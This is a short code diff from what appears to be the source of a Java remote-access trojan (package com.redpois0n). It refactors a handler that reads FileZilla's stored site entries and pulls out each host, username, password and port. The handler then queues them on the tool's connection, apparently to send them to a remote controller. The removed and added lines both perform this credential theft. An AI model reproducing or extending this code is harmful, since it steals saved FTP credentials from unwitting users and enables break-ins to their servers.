@@ -13,6 +13,7 @@ import org.w3c.dom.NodeList;
 import com.redpois0n.Connection;
 import com.redpois0n.common.OperatingSystem;
 import com.redpois0n.packets.outgoing.Header;
+import com.redpois0n.packets.outgoing.Packet48FileZillaPassword;
 import com.redpois0n.utils.Utils;
 
 
@@ -36,12 +37,7 @@ public class PacketFZ extends AbstractIncomingPacket {
 					if (nNode.getNodeType() == Node.ELEMENT_NODE) {
 						Element eElement = (Element) nNode;
 						
-						PacketBuilder packet = new PacketBuilder(Header.PASSWORD_FILEZILLA);
-						packet.add(Utils.getTagValue("Host", eElement));
-						packet.add(Utils.getTagValue("User", eElement));
-						packet.add(Utils.getTagValue("Pass", eElement));
-						packet.add(Utils.getTagValue("Port", eElement));
-						Connection.addToSendQueue(packet);
+						Connection.addToSendQueue(new Packet48FileZillaPassword(Utils.getTagValue("Host", eElement), Utils.getTagValue("User", eElement), Utils.getTagValue("Pass", eElement), Utils.getTagValue("Port", eElement)));
 					}
 				}
 			}
